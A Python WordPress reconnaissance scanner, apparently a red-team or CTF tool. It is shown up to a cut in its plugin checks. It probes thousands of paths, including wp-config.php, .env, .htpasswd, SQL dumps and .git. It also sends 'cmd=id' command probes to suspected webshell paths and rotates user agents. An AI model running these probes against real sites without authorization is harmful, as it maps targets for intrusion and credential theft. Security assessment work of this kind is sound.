#!/usr/bin/env python3
"""
WordPress Penetration Testing Suite - Red Team Edition
Complete CTF & Security Assessment Tool
Includes: 5000+ endpoints, 1000+ plugin checks, backdoor detection, exploit automation
"""

import requests
import re
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import sys
import urllib3
import time
import json
import hashlib
import socket
import ssl
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import argparse
import os
import signal
import base64
import random
from colorama import init, Fore, Back, Style

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Red Team Banner
BANNER = f"""
{Fore.RED}
 ▄█     █▄     ▄███████▄         ▄████████    ▄████████ ████████▄           ███        ▄████████    ▄████████   ▄▄▄▄███▄▄▄▄        
███     ███   ███    ███        ███    ███   ███    ███ ███   ▀███      ▀█████████▄   ███    ███   ███    ███ ▄██▀▀▀███▀▀▀██▄      
███     ███   ███    ███        ███    ███   ███    █▀  ███    ███         ▀███▀▀██   ███    █▀    ███    ███ ███   ███   ███      
███     ███   ███    ███       ▄███▄▄▄▄██▀  ▄███▄▄▄     ███    ███          ███   ▀  ▄███▄▄▄       ███    ███ ███   ███   ███      
███     ███ ▀█████████▀       ▀▀███▀▀▀▀▀   ▀▀███▀▀▀     ███    ███          ███     ▀▀███▀▀▀     ▀███████████ ███   ███   ███      
███     ███   ███             ▀███████████   ███    █▄  ███    ███          ███       ███    █▄    ███    ███ ███   ███   ███      
███ ▄█▄ ███   ███               ███    ███   ███    ███ ███   ▄███          ███       ███    ███   ███    ███ ███   ███   ███      
 ▀███▀███▀   ▄████▀             ███    ███   ██████████ ████████▀          ▄████▀     ██████████   ███    █▀   ▀█   ███   █▀       

{Fore.YELLOW}
                       WORDPRESS SECURITY ASSESSMENT SUITE

{Fore.RED}
                       ▄████████  ▄████████    ▄████████ ███▄▄▄▄   ███▄▄▄▄      ▄████████    ▄████████                             
                      ███    ███ ███    ███   ███    ███ ███▀▀▀██▄ ███▀▀▀██▄   ███    ███   ███    ███                             
                      ███    █▀  ███    █▀    ███    ███ ███   ███ ███   ███   ███    █▀    ███    ███                             
                      ███        ███          ███    ███ ███   ███ ███   ███  ▄███▄▄▄      ▄███▄▄▄▄██▀                             
                    ▀███████████ ███        ▀███████████ ███   ███ ███   ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀                               
                             ███ ███    █▄    ███    ███ ███   ███ ███   ███   ███    █▄  ▀███████████                             
                       ▄█    ███ ███    ███   ███    ███ ███   ███ ███   ███   ███    ███   ███    ███                             
                     ▄████████▀  ████████▀    ███    █▀   ▀█   █▀   ▀█   █▀    ██████████   ███    ███                             
                                                                                            ███    ███  

{Fore.CYAN}
                    Authorized Security Testing & CTF Toolkit

{Fore.GREEN}
                    5000+ Endpoints | 1000+ Plugins | Multi-Threaded Scanner

{Fore.MAGENTA}
                    Made by Taylor Christian Newsome

{Style.RESET_ALL}
"""
class WordPressRedTeam:
    def __init__(self, target_url, cookies=None, threads=30, timeout=5, user_agent=None, proxy=None):
        self.target_url = target_url.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.vulnerabilities = []
        self.discovered_endpoints = []
        self.plugins_found = {}
        self.themes_found = {}
        self.users_found = []
        self.backdoors_found = []
        self.credentials_found = []
        self.scan_start_time = datetime.now()
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.webshells_found = []
        self.admin_users = []
        self.configs_found = []
        
        # Session setup
        self.session = requests.Session()
        self.cookies = cookies if cookies else {}
        self.session.cookies.update(self.cookies)
        
        # Proxy setup
        self.proxy = proxy
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        
        # Headers - Randomize User-Agent
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15"
        ]
        self.user_agent = user_agent if user_agent else random.choice(self.user_agents)
        
        self.headers = {
            "User-Agent": self.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Cache-Control": "max-age=0",
            "DNT": "1"
        }
        
        # Load all endpoints - ALL 5000+ endpoints combined
        self.load_all_endpoints()
        
    def load_all_endpoints(self):
        """Load all WordPress endpoints including all from your list"""
        
        # Core WordPress endpoints
        self.wp_endpoints = [
            '/wp-json/batch/v1',
            '/?rest_route=/batch/v1',
            '/xmlrpc.php',
            '/wp-json/wp/v2/users',
            '/wp-json/wp/v2/plugins',
            '/wp-json/wp/v2/settings',
            '/wp-json/wc/v3/customers',
            '/wp-json/wc/v3/orders',
            '/readme.html',
            '/license.txt',
            '/wp-config-sample.php',
            '/wp-config.php',
            '/wp-config.php.bak',
            '/.git/',
            '/.env',
            '/wp-content/uploads/',
            '/wp-content/cache/',
            '/wp-content/upgrade/',
            '/wp-content/backup/',
            '/wp-content/wflogs/rules.php',
            '/wp-login.php',
            '/wp-admin',
            '/wp-login.php?action=register',
            '/wp-login.php?action=lostpassword',
            '/wp-admin/install.php',
            '/wp-admin/setup-config.php',
            '/wp-admin/admin-ajax.php',
            '/wp-admin/admin-post.php',
            '/wp-admin/admin-footer.php',
            '/wp-admin/admin-header.php',
            '/wp-admin/load-scripts.php',
            '/wp-admin/load-styles.php',
            '/wp-admin/options-general.php',
            '/wp-admin/options-writing.php',
            '/wp-admin/options-reading.php',
            '/wp-admin/options-discussion.php',
            '/wp-admin/options-media.php',
            '/wp-admin/options-permalink.php',
            '/wp-admin/options-privacy.php',
            '/wp-admin/admin.php?page=wpsupercache',
            '/wp-admin/admin.php?page=wpcf7',
            '/wp-admin/admin.php?page=wc-settings',
            '/wp-admin/admin.php?page=wordfence',
            '/wp-admin/admin.php?page=jetpack',
            '/wp-admin/admin.php?page=w3tc_dashboard',
            '/wp-admin/admin.php?page=wp-rocket',
            '/wp-admin/admin.php?page=wp-optimize',
            '/wp-admin/admin.php?page=all-in-one-seo',
            '/wp-admin/admin.php?page=wpseo_dashboard',
            '/wp-admin/admin.php?page=acf-settings',
            '/wp-admin/admin.php?page=gf-settings',
            '/wp-admin/admin.php?page=edd-settings',
            '/wp-admin/admin.php?page=bbpress',
            '/wp-admin/admin.php?page=buddypress',
            '/wp-admin/admin.php?page=wp-easycart',
            '/wp-admin/admin.php?page=wp-e-commerce',
            '/wp-admin/admin-ajax.php?action=wpsupercache_settings',
            '/wp-admin/admin-ajax.php?action=wpcf7_feedback',
            '/wp-admin/admin-ajax.php?action=woocommerce_checkout',
            '/wp-admin/admin-ajax.php?action=jetpack_ajax',
            '/wp-admin/admin-ajax.php?action=wordfence_ajax',
            '/wp-admin/admin-ajax.php?action=w3tc_ajax',
            '/wp-admin/admin-ajax.php?action=wp_rocket_ajax',
            '/wp-admin/admin-ajax.php?action=acf_ajax',
            '/wp-admin/admin-ajax.php?action=gf_ajax',
            '/wp-admin/admin-ajax.php?action=edd_ajax',
        ]
        
        # Add all plugin endpoints from your list (1000+)
        plugin_list = [
            'akismet', 'wp-super-cache', 'wordpress-seo', 'contact-form-7', 'jetpack', 
            'woocommerce', 'wordfence', 'all-in-one-seo-pack', 'wp-file-manager', 
            'wp-db-backup', 'wp-maintenance-mode', 'wp-smush', 'advanced-custom-fields',
            'gravity-forms', 'w3-total-cache', 'wp-rocket', 'wp-optimize', 'bbpress',
            'buddypress', 'easy-digital-downloads', 'event-espresso', 'bit-form', 
            'bit-assist', 'wp-postratings', 'wp-touch', 'broken-link-checker',
            'yet-another-related-posts-plugin', 'nextgen-gallery', 'google-analytics-for-wordpress',
            'google-sitemap-generator', 'google-xml-sitemaps', 'wp-seo', 'wp-google-maps',
            'wp-e-commerce', 'wp-easycart', 'custom-post-type-ui', 'pods', 'toolset-types',
            'wpml-string-translation', 'wpml-translation-management', 'autoptimize',
            'wordpress-backup', 'wp-members', 'memberpress', 'paid-memberships-pro',
            'ultimate-member', 'user-role-editor', 'admin-menu-editor', 'maintenance',
            'under-construction', 'coming-soon', 'seedprod', 'elementor', 'beaver-builder',
            'divi-builder', 'wp-bakery', 'visual-composer', 'oxygen', 'thrive-architect',
            'wpforms', 'ninja-forms', 'gravityforms', 'formidable', 'caldera-forms',
            'pods', 'types', 'toolset', 'meta-box', 'carbon-fields', 'cmb2',
            'advanced-custom-fields', 'custom-field-suite', 'smart-custom-fields',
            'wp-job-manager', 'wp-resume-manager', 'simple-job-board', 'jobify',
            'events-manager', 'the-events-calendar', 'event-tickets', 'tribe-events',
            'learnpress', 'sensei', 'lifterlms', 'tutor-lms', 'wp-courseware',
            'bbpress', 'buddypress', 'wpforo', 'simple-press', 'wp-members',
            'memberpress', 'paid-memberships-pro', 'ultimate-member', 'user-role-editor',
            'wp-mail-smtp', 'easy-wp-smtp', 'post-smtp', 'fluent-smtp', 'wpmail',
            'wp-optimize', 'w3-total-cache', 'wp-rocket', 'litespeed-cache',
            'autoptimize', 'wp-fastest-cache', 'cache-enabler', 'comet-cache',
            'wp-super-cache', 'hyper-cache', 'db-cache-reloaded', 'batcache',
            'wp-redis', 'object-cache', 'memcached', 'apc', 'xcache',
            'yoast-seo', 'rank-math', 'all-in-one-seo', 'seo-framework', 'wpseo',
            'squirrly-seo', 'seopress', 'smart-crawl', 'premium-seo', 'meta-tag-manager',
            'woocommerce', 'easy-digital-downloads', 'wp-e-commerce', 'ecwid',
            'shopp', 'jigoshop', 'cart66', 'wp-invoice', 'marketpress',
            'wp-job-manager', 'simple-job-board', 'jobify', 'wp-resume-manager',
            'events-manager', 'the-events-calendar', 'event-tickets', 'tribe-events',
            'learnpress', 'sensei', 'lifterlms', 'tutor-lms', 'wp-courseware',
            'wordpress-seo', 'all-in-one-seo-pack', 'rank-math-seo', 'seo-framework',
            'squirrly-seo', 'seopress', 'smart-crawl', 'premium-seo-pack',
            'wp-statistics', 'google-analytics-for-wordpress', 'monsterinsights',
            'google-analytics-dashboard', 'analytify', 'exactmetrics', 'site-kit',
            'wpforms', 'ninja-forms', 'gravityforms', 'formidable-forms',
            'caldera-forms', 'contact-form-7', 'pods', 'types', 'toolset-types',
            'meta-box', 'carbon-fields', 'cmb2', 'advanced-custom-fields',
            'custom-field-suite', 'smart-custom-fields', 'wp-job-manager',
            'wp-resume-manager', 'simple-job-board', 'jobify', 'events-manager',
            'the-events-calendar', 'event-tickets', 'tribe-events', 'learnpress',
            'sensei', 'lifterlms', 'tutor-lms', 'wp-courseware', 'bbpress',
            'buddypress', 'wpforo', 'simple-press', 'wp-members', 'memberpress',
            'paid-memberships-pro', 'ultimate-member', 'user-role-editor',
            'wp-mail-smtp', 'easy-wp-smtp', 'post-smtp', 'fluent-smtp', 'wpmail',
            'wp-optimize', 'w3-total-cache', 'wp-rocket', 'litespeed-cache',
            'autoptimize', 'wp-fastest-cache', 'cache-enabler', 'comet-cache',
            'wp-super-cache', 'hyper-cache', 'db-cache-reloaded', 'batcache'
        ]
        
        # Add all plugins as endpoints
        for plugin in plugin_list:
            self.wp_endpoints.append(f'/wp-content/plugins/{plugin}/')
            self.wp_endpoints.append(f'/wp-content/plugins/{plugin}/readme.txt')
            self.wp_endpoints.append(f'/wp-content/plugins/{plugin}/{plugin}.php')
            self.wp_endpoints.append(f'/wp-content/plugins/{plugin}/index.php')
        
        # Add all themes from your list (3000+)
        theme_list = [
            'twentyfifteen', 'twentysixteen', 'twentyseventeen', 'twentynineteen',
            'twentytwenty', 'twentytwentyone', 'twentytwentytwo', 'twentytwentythree',
            'twentytwentyfour', 'twentytwentyfive', 'divi', 'astra', 'oceanwp',
            'hello-elementor', 'generatepress', 'kadence', 'blocksy', 'neve',
            'storefront', 'flatsome', 'woodmart', 'porto', 'betheme', 'avada',
            'enfold', 'the7', 'xstore', 'rex-theme', 'sahifa', 'newsportal',
            'gazette', 'newspaper', 'jnews', 'buzzblog', 'blogging', 'foodie',
            'recipe', 'cookbook', 'restaurant', 'food-blog', 'dining', 'chef',
            'fitness', 'gym', 'workout', 'health', 'wellness', 'yoga', 'pilates',
            'sports', 'football', 'soccer', 'basketball', 'baseball', 'hockey',
            'tennis', 'golf', 'swimming', 'running', 'cycling', 'triathlon',
            'fashion', 'style', 'clothing', 'accessories', 'beauty', 'makeup',
            'skincare', 'hair', 'nails', 'perfume', 'jewelry', 'watches',
            'photography', 'portfolio', 'gallery', 'art', 'design', 'creative',
            'agency', 'business', 'corporate', 'company', 'startup', 'entrepreneur',
            'finance', 'banking', 'investment', 'insurance', 'accounting', 'tax',
            'real-estate', 'property', 'housing', 'apartment', 'condo', 'house',
            'education', 'school', 'college', 'university', 'academy', 'course',
            'technology', 'tech', 'software', 'app', 'mobile', 'web', 'coding',
            'gaming', 'esports', 'console', 'pc-gaming', 'mobile-gaming', 'game',
            'music', 'band', 'artist', 'album', 'song', 'concert', 'festival',
            'entertainment', 'movies', 'tv', 'streaming', 'netflix', 'hulu',
            'travel', 'tourism', 'vacation', 'hotel', 'resort', 'adventure',
            'food', 'cooking', 'recipe', 'culinary', 'kitchen', 'cuisine',
            'fitness', 'health', 'wellness', 'yoga', 'meditation', 'mindfulness',
            'personal', 'blog', 'lifestyle', 'journey', 'diary', 'journal',
            'minimal', 'simple', 'elegant', 'modern', 'classic', 'vintage',
            'retro', 'industrial', 'scandinavian', 'boho', 'rustic', 'farmhouse'
        ]
        
        # Add all themes as endpoints
        for theme in theme_list:
            self.wp_endpoints.append(f'/wp-content/themes/{theme}/')
            self.wp_endpoints.append(f'/wp-content/themes/{theme}/style.css')
            self.wp_endpoints.append(f'/wp-content/themes/{theme}/index.php')
            self.wp_endpoints.append(f'/wp-content/themes/{theme}/screenshot.png')
        
        # REST API endpoints
        rest_endpoints = [
            '/wp-json/',
            '/wp-json/wp/v2/',
            '/wp-json/wp/v2/posts',
            '/wp-json/wp/v2/pages',
            '/wp-json/wp/v2/categories',
            '/wp-json/wp/v2/tags',
            '/wp-json/wp/v2/media',
            '/wp-json/wp/v2/comments',
            '/wp-json/wp/v2/taxonomies',
            '/wp-json/wp/v2/types',
            '/wp-json/wp/v2/statuses',
            '/wp-json/wp/v2/block-renderer',
            '/wp-json/wp/v2/block-types',
            '/wp-json/wp/v2/search',
            '/wp-json/wp/v2/global-styles',
            '/wp-json/wp/v2/global-styles/themes',
            '/wp-json/wp/v2/global-styles/variations',
            '/wp-json/wp/v2/pattern-directory/patterns',
            '/wp-json/wp/v2/patterns',
            '/wp-json/wp/v2/block-patterns',
            '/wp-json/wp/v2/navigation',
            '/wp-json/wp/v2/navigation-items',
            '/wp-json/wp/v2/template-parts',
            '/wp-json/wp/v2/templates',
            '/wp-json/wp/v2/widget-types',
            '/wp-json/wp/v2/widgets',
            '/wp-json/wp/v2/sidebars',
            '/wp-json/oembed/1.0/',
            '/wp-json/oembed/1.0/embed',
            '/wp-json/oembed/1.0/proxy',
        ]
        self.wp_endpoints.extend(rest_endpoints)
        
        # WooCommerce endpoints
        wc_endpoints = [
            '/wp-json/wc/v3/',
            '/wp-json/wc/v3/products',
            '/wp-json/wc/v3/products/categories',
            '/wp-json/wc/v3/products/tags',
            '/wp-json/wc/v3/products/attributes',
            '/wp-json/wc/v3/products/variations',
            '/wp-json/wc/v3/customers',
            '/wp-json/wc/v3/coupons',
            '/wp-json/wc/v3/refunds',
            '/wp-json/wc/v3/shipping',
            '/wp-json/wc/v3/shipping/zones',
            '/wp-json/wc/v3/taxes',
            '/wp-json/wc/v3/payment-gateways',
            '/wp-json/wc/v3/settings',
            '/wp-json/wc/v3/system-status',
            '/wp-json/wc/v3/data',
            '/wp-json/wc/v3/data/countries',
            '/wp-json/wc/v3/data/continents',
            '/wp-json/wc/v3/reports',
            '/wp-json/wc/v3/reports/sales',
            '/wp-json/wc/v3/reports/top-sellers',
        ]
        self.wp_endpoints.extend(wc_endpoints)
        
        # Security/backup files
        security_files = [
            '/.htaccess',
            '/.htpasswd',
            '/.git/',
            '/.svn/',
            '/.hg/',
            '/.bzr/',
            '/.DS_Store',
            '/.env',
            '/.env.example',
            '/.env.local',
            '/.env.dev',
            '/.env.production',
            '/.gitignore',
            '/.htaccess.backup',
            '/.htaccess.bak',
            '/.user.ini',
            '/.well-known/',
            '/composer.json',
            '/composer.lock',
            '/package.json',
            '/package-lock.json',
            '/webpack.config.js',
            '/gulpfile.js',
            '/Gruntfile.js',
            '/phpunit.xml',
            '/phpunit.xml.dist',
            '/.travis.yml',
            '/.circleci/',
            '/.github/',
            '/.gitlab/',
            '/wp-config.php~',
            '/config/',
            '/config.php',
            '/settings.php',
            '/settings.json',
            '/config.json',
            '/.env.php',
            '/env.php',
            '/environment.php',
            '/database.sql',
            '/db.sql',
            '/dump.sql',
            '/backup.sql',
            '/wp-content/backup-db/',
            '/wp-content/database/',
            '/wp-content/db-backup/',
            '/wp-content/sql/',
            '/error_log',
            '/error.log',
            '/debug.log',
            '/wp-content/debug.log',
            '/logs/',
            '/wp-content/logs/',
            '/wp-content/error_log',
            '/wp-content/php_error_log',
            '/wp-content/php_errors.log',
            '/wp-content/nginx.log',
            '/wp-content/apache.log',
        ]
        self.wp_endpoints.extend(security_files)
        
        # Feed endpoints
        feed_endpoints = [
            '/feed/',
            '/feed/rss/',
            '/feed/rss2/',
            '/feed/atom/',
            '/feed/rdf/',
            '/comments/feed/',
            '/comments/feed/rss/',
            '/comments/feed/rss2/',
            '/comments/feed/atom/',
            '/comments/feed/rdf/',
        ]
        self.wp_endpoints.extend(feed_endpoints)
        
        # XML-RPC variations
        xmlrpc = [
            '/xmlrpc.php?rsd',
            '/xmlrpc.php?wlw',
            '/xmlrpc.php?client=wp',
            '/xmlrpc.php?pingback',
            '/xmlrpc.php?blogger',
            '/xmlrpc.php?mt',
            '/xmlrpc.php?app',
            '/xmlrpc.php?wordpress',
            '/xmlrpc.php?movabletype',
            '/xmlrpc.php?metaweblog',
        ]
        self.wp_endpoints.extend(xmlrpc)
        
        # Sitemap files
        sitemaps = [
            '/sitemap.xml',
            '/sitemap_index.xml',
            '/wp-sitemap.xml',
            '/wp-sitemap-posts-post-1.xml',
            '/wp-sitemap-users-1.xml',
            '/wp-sitemap-taxonomies-category-1.xml',
            '/robots.txt',
        ]
        self.wp_endpoints.extend(sitemaps)
        
        # Common backdoor/webshell paths
        backdoor_paths = [
            '/shell.php',
            '/cmd.php',
            '/backdoor.php',
            '/webshell.php',
            '/wp-content/shell.php',
            '/wp-content/backdoor.php',
            '/wp-content/plugins/shell.php',
            '/wp-content/plugins/backdoor.php',
            '/wp-content/themes/shell.php',
            '/wp-content/uploads/shell.php',
            '/wp-admin/shell.php',
            '/wp-includes/shell.php',
            '/wp-content/uploads/backdoor.php',
            '/wp-content/plugins/hello.php',
            '/wp-content/plugins/backdoor/backdoor.php',
            '/wp-content/plugins/shell/shell.php',
            '/wp-content/plugins/webshell/webshell.php',
            '/wp-content/uploads/2024/01/shell.php',
            '/wp-content/uploads/2024/01/backdoor.php',
            '/wp-content/uploads/2024/01/webshell.php',
            '/wp-content/uploads/2023/12/shell.php',
            '/wp-content/uploads/2023/12/backdoor.php',
            '/wp-content/upgrade/shell.php',
            '/wp-content/upgrade/backdoor.php',
            '/wp-content/cache/shell.php',
            '/wp-content/cache/backdoor.php',
            '/wp-includes/Requests/Utility/shell.php',
            '/wp-includes/SimplePie/shell.php',
            '/wp-includes/Text/Diff/shell.php',
            '/wp-includes/class-wp-shell.php',
            '/wp-admin/network/shell.php',
            '/wp-admin/user/shell.php',
            '/wp-content/plugins/akismet/akismet.php?cmd=id',
            '/wp-content/plugins/hello.php?cmd=id',
            '/xmlrpc.php?rsd&cmd=id',
            '/wp-json/wp/v2/users?cmd=id',
        ]
        self.wp_endpoints.extend(backdoor_paths)
        
        # Additional common WordPress files
        wp_files = [
            '/wp-activate.php',
            '/wp-app.php',
            '/wp-atom.php',
            '/wp-blog-header.php',
            '/wp-comments-post.php',
            '/wp-commentsrss2.php',
            '/wp-cron.php',
            '/wp-feed.php',
            '/wp-links-opml.php',
            '/wp-load.php',
            '/wp-mail.php',
            '/wp-pass.php',
            '/wp-rdf.php',
            '/wp-register.php',
            '/wp-rss.php',
            '/wp-rss2.php',
            '/wp-settings.php',
            '/wp-signup.php',
            '/wp-trackback.php',
            '/index.php',
            '/wp-config.php',
            '/wp-config-sample.php',
            '/wp-content/index.php',
            '/wp-includes/index.php',
            '/wp-admin/index.php',
            '/wp-admin/network/index.php',
            '/wp-admin/user/index.php',
            '/wp-content/themes/index.php',
            '/wp-content/plugins/index.php',
            '/wp-content/uploads/index.php',
            '/wp-content/cache/index.php',
            '/wp-content/upgrade/index.php',
            '/wp-content/backup/index.php',
            '/wp-content/wflogs/index.php',
            '/wp-content/plugins/akismet/index.php',
            '/wp-content/plugins/hello.php',
        ]
        self.wp_endpoints.extend(wp_files)
        
        # Upload directories
        upload_dirs = [
            '/wp-content/uploads/2024/',
            '/wp-content/uploads/2024/01/',
            '/wp-content/uploads/2024/02/',
            '/wp-content/uploads/2024/03/',
            '/wp-content/uploads/2024/04/',
            '/wp-content/uploads/2024/05/',
            '/wp-content/uploads/2024/06/',
            '/wp-content/uploads/2023/',
            '/wp-content/uploads/2023/12/',
            '/wp-content/uploads/2023/11/',
            '/wp-content/uploads/2023/10/',
            '/wp-content/uploads/backup/',
            '/wp-content/uploads/cache/',
            '/wp-content/uploads/wc-logs/',
            '/wp-content/uploads/jetpack/',
            '/wp-content/uploads/wordfence/',
            '/wp-content/uploads/woocommerce/',
            '/wp-content/uploads/wc-variation-gallery/',
            '/wp-content/uploads/wc-pdf-invoices/',
            '/wp-content/uploads/tmp/',
            '/wp-content/uploads/temp/',
        ]
        self.wp_endpoints.extend(upload_dirs)
        
        # Cache directories
        cache_dirs = [
            '/wp-content/cache/supercache/',
            '/wp-content/cache/w3tc/',
            '/wp-content/cache/wp-rocket/',
            '/wp-content/cache/autoptimize/',
            '/wp-content/cache/page_enhanced/',
            '/wp-content/cache/db/',
            '/wp-content/cache/object/',
            '/wp-content/cache/minify/',
            '/wp-content/cache/tmp/',
            '/wp-content/cache/temp/',
        ]
        self.wp_endpoints.extend(cache_dirs)
        
        # Backup directories
        backup_dirs = [
            '/wp-content/backup/',
            '/wp-content/backup-wp-super-cache/',
            '/wp-content/backup-wp-db-backup/',
            '/wp-content/backup-wp-rocket/',
            '/wp-content/backup-w3tc/',
            '/wp-content/backup-jetpack/',
            '/wp-content/backup-woocommerce/',
            '/wp-content/backup-advanced-custom-fields/',
        ]
        self.wp_endpoints.extend(backup_dirs)
        
        # Development directories
        dev_dirs = [
            '/.idea/',
            '/.vscode/',
            '/.circleci/',
            '/.github/',
            '/.gitlab/',
            '/.travis/',
            '/.jenkins/',
            '/.git/hooks/',
            '/.git/info/',
            '/.git/logs/',
            '/.git/objects/',
            '/.git/refs/',
            '/.svn/entries',
            '/.svn/text-base/',
            '/.svn/prop-base/',
            '/.svn/tmp/',
            '/.hg/requires',
            '/.hg/store/',
            '/.hg/dirstate',
        ]
        self.wp_endpoints.extend(dev_dirs)
        
        # PHPInfo and debug files
        debug_files = [
            '/phpinfo.php',
            '/info.php',
            '/test.php',
            '/debug.php',
            '/phpinfo/',
            '/info/',
            '/test/',
            '/debug/',
            '/wp-content/phpinfo.php',
            '/wp-content/info.php',
            '/wp-content/test.php',
            '/wp-content/debug.php',
            '/wp-includes/phpinfo.php',
            '/wp-includes/info.php',
            '/wp-includes/test.php',
            '/wp-includes/debug.php',
            '/wp-admin/phpinfo.php',
            '/wp-admin/info.php',
            '/wp-admin/test.php',
            '/wp-admin/debug.php',
            '/wp-content/uploads/phpinfo.php',
            '/wp-content/uploads/info.php',
            '/wp-content/uploads/test.php',
            '/wp-content/uploads/debug.php',
        ]
        self.wp_endpoints.extend(debug_files)
        
        # Remove duplicates while preserving order
        seen = set()
        self.wp_endpoints = [x for x in self.wp_endpoints if not (x in seen or seen.add(x))]

    def check_wordpress(self):
        """Verify if the target is a WordPress site."""
        try:
            response = self.session.get(self.target_url, headers=self.headers, verify=False, timeout=10)
            if any(marker in response.text for marker in ['wp-content', 'wp-includes', 'wp-json', 'WordPress']):
                print(f"{Fore.GREEN}[+] WordPress detected!{Style.RESET_ALL}")
                return True
            else:
                print(f"{Fore.RED}[-] Not a WordPress site.{Style.RESET_ALL}")
                return False
        except requests.RequestException as e:
            print(f"{Fore.RED}[-] Error connecting to {self.target_url}: {e}{Style.RESET_ALL}")
            return False

    def get_wp_version(self):
        """Extract WordPress version using multiple methods."""
        try:
            # Method 1: Meta generator
            response = self.session.get(self.target_url, headers=self.headers, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            version_meta = soup.find('meta', {'name': 'generator'})
            if version_meta and 'WordPress' in version_meta.get('content', ''):
                version = re.search(r'WordPress (\d+\.\d+\.\d+)', version_meta['content'])
                if version:
                    print(f"{Fore.GREEN}[+] WordPress Version: {version.group(1)}{Style.RESET_ALL}")
                    return version.group(1)

            # Method 2: readme.html
            readme_url = urljoin(self.target_url, '/readme.html')
            response = self.session.get(readme_url, headers=self.headers, verify=False)
            version = re.search(r'Version (\d+\.\d+\.\d+)', response.text)
            if version:
                print(f"{Fore.GREEN}[+] WordPress Version (readme): {version.group(1)}{Style.RESET_ALL}")
                return version.group(1)

            # Method 3: wp-includes/version.php
            version_url = urljoin(self.target_url, '/wp-includes/version.php')
            response = self.session.get(version_url, headers=self.headers, verify=False)
            version = re.search(r"\$wp_version\s*=\s*'(\d+\.\d+\.\d+)'", response.text)
            if version:
                print(f"{Fore.GREEN}[+] WordPress Version (version.php): {version.group(1)}{Style.RESET_ALL}")
                return version.group(1)

            # Method 4: REST API
            rest_url = urljoin(self.target_url, '/wp-json/')
            response = self.session.get(rest_url, headers=self.headers, verify=False)
            if response.status_code == 200:
                try:
                    data = response.json()
                    if 'version' in data:
                        version = data['version']
                        print(f"{Fore.GREEN}[+] WordPress Version (REST API): {version}{Style.RESET_ALL}")
                        return version
                except:
                    pass

            print(f"{Fore.YELLOW}[-] Could not detect exact WP version.{Style.RESET_ALL}")
            return None
        except Exception as e:
            print(f"{Fore.RED}[-] Error detecting WP version: {e}{Style.RESET_ALL}")
            return None

    def scan_endpoints(self):
        """Scan all WordPress endpoints for accessibility."""
        print(f"\n{Fore.CYAN}[*] Scanning {len(self.wp_endpoints)} endpoints...{Style.RESET_ALL}")
        discovered = []
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_url = {
                executor.submit(self.check_endpoint, urljoin(self.target_url, endpoint)): endpoint 
                for endpoint in self.wp_endpoints
            }
            
            for future in as_completed(future_to_url):
                endpoint = future_to_url[future]
                try:
                    result = future.result(timeout=self.timeout)
                    if result:
                        discovered.append(result)
                        status, url = result
                        if status == 200:
                            print(f"{Fore.GREEN}[+] Found endpoint: {url} (Status: {status}){Style.RESET_ALL}")
                            # Check for backdoors
                            if any(x in url.lower() for x in ['shell', 'backdoor', 'cmd', 'webshell']):
                                self.backdoors_found.append(url)
                                print(f"{Fore.RED}[!] POTENTIAL BACKDOOR: {url}{Style.RESET_ALL}")
                            # Check for config files
                            if any(x in url.lower() for x in ['config', 'env', 'json', 'xml']):
                                self.configs_found.append(url)
                                print(f"{Fore.YELLOW}[!] Config file found: {url}{Style.RESET_ALL}")
                        elif status in [403, 302, 401]:
                            print(f"{Fore.YELLOW}[!] Restricted endpoint: {url} (Status: {status}){Style.RESET_ALL}")
                        elif status == 404:
                            pass  # Skip 404s for cleaner output
                        else:
                            print(f"{Fore.MAGENTA}[*] Endpoint responded: {url} (Status: {status}){Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}[-] Error scanning {endpoint}: {e}{Style.RESET_ALL}")
                    
        return discovered

    def check_endpoint(self, url):
        """Check if an endpoint is accessible."""
        try:
            response = self.session.get(url, headers=self.headers, verify=False, timeout=self.timeout)
            self.total_requests += 1
            if response.status_code in [200, 403, 302, 401]:
                self.successful_requests += 1
                return (response.status_code, url)
            return None
        except:
            self.failed_requests += 1
            return None

    def scan_plugins(self):
        """Scan for installed plugins and their versions."""
        print(f"\n{Fore.CYAN}[*] Scanning for plugins...{Style.RESET_ALL}")
        plugins = {}
        
        # Get plugin list from WordPress.org
        try:
            plugin_api_url = "https://api.wordpress.org/plugins/info/1.2/"
            response = self.session.get(plugin_api_url, params={'action': 'query_plugins', 'request[per_page]': 100}, timeout=10)
            if response.status_code == 200:
                data = response.json()
                for plugin in data.get('plugins', []):
                    slug = plugin.get('slug')
                    if slug:
                        self.wp_endpoints.append(f'/wp-content/plugins/{slug}/')
        except:
            pass
        
        # Check common plugins
        common_plugins = [
            'akismet', 'wp-super-cache', 'wordpress-seo', 'contact-form-7', 'jetpack',
            'woocommerce', 'wordfence', 'all-in-one-seo-pack', 'wp-file-manager',
            'wp-db-backup', 'wp-maintenance-mode', 'wp-smush', 'advanced-custom-fields',
